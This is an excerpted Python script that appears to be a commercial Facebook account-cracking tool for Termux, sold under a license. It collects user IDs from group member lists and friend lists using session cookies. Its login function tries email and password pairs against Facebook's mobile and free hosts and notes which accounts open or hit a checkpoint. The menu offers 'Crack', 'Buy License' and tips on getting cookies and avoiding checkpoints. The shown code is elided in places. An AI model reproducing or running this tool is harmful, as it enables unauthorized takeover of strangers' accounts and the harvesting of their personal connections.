...
def lang(cookies):
	...
	for i in rr.find_all("a",href=True):
		if "indonesia" in i.text.lower():
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/me",headers=hdcok(),cookies=cookies).text
...
class dump_grup:
	...
	def f(self):
		self.fl=raw_input('?: result filename: ')
		if self.fl=='':self.f()
		...
		for i in r.find_all("a",href=True):
			...
			if "lihat teman lain" in i.text.lower():
				...
				while True:
					try:
						self.dump(
						"https://mbasic.facebook.com/"+i.get("href"))
						__import__("time").sleep(2)
						break
...
def login(em,pas,hosts, **kwargs):
	global ua
	try:
		r=requests.Session()
		r.headers.update({"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p=r.get(hosts+"/login/?next&ref=dbl&refid=8").text
		b=bs4.BeautifulSoup(p,"html.parser")
		bl=[
			"lsd","jazoest","m_ts","li","try_number"
			,"unrecognized_tries","login"
		]
		for i in b("input"):
			try:
				if i.get("name") in bl:
		...
		posts=r.post(hosts+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs) # EDIT VERIFY
		if "c_user" in r.cookies.get_dict().keys():
			...
			return {
				"status":"cp",
				"cookies":posts.cookies.get_dict(),
				"host":hosts,
				"email":em,
				"pass":pas
			}
		...
		if "free.facebook.com" in hosts:
			return login(em,pas,"https://mbasic.facebook.com")
		else:
			return login(em,pas,"https://free.facebook.com")
...
def dumpfl():
	...
	r=requests.get("https://mbasic.facebook.com/me",
		cookies=cvds,
	headers=hdcok()).text
...
class lc:
	def __init__(self):
		self.path="/data/data/com.termux/files/usr/bin/.reyy"
	...
	def cek(self):
		...
		if r.json().get("status")=="success":
			if r.json().get("result")["confirmed"]=="false":
				...
				clear()
				print("+ order: %s days, name- %s\n"%(r.json()["result"]["license_limit"],r.json()["result"]["name"]))
...
while True:
	...
	print "[4] Crack"
	print "[5] Buy License"
	print "[6] how to get cookie"
	print "[7] how to login without checkpoint"
	print "[8] move account.\n"
	...
	if r=="":
		...
		try:
			os.remove("/data/data/com.termux/files/usr/bin/.reyy")
